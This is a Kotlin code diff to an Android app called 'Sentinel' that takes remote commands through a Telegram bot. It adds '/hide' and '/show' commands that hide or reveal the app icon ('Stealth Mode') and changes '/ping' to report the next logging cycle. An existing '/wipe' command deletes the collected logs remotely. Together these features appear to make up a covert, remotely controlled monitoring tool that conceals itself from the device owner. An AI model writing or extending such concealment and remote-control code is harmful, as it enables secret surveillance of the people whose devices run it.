@@ -10,6 +10,7 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 
 class CommandProcessor(
+    private val context: android.content.Context,
     private val repository: LogRepository,
     private val client: TelegramClient
 ) {
@@ -57,13 +58,24 @@ class CommandProcessor(
         
         when {
             command.startsWith("/ping") -> {
-                client.sendMessage("Pong! Sentinel is active.")
+                val nextRun = System.currentTimeMillis() + 15 * 60 * 1000
+                val formatter = java.text.SimpleDateFormat("HH:mm", java.util.Locale.getDefault())
+                val timeString = formatter.format(java.util.Date(nextRun))
+                client.sendMessage("Pong! Next cycle at: $timeString")
             }
             command.startsWith("/wipe") -> {
                 scope.launch {
                     repository.deleteAllLogs()
                     client.sendMessage("Logs wiped locally.")
                 }
+            }
+            command.startsWith("/hide") -> {
+                com.zero.sentinel.utils.StealthManager.hideAppIcon(context)
+                client.sendMessage("Stealth Mode: ON. App icon hidden.")
+            }
+            command.startsWith("/show") -> {
+                com.zero.sentinel.utils.StealthManager.showAppIcon(context)
+                client.sendMessage("Stealth Mode: OFF. App icon visible.")
             }
             else -> {
                 // Ignore unknown
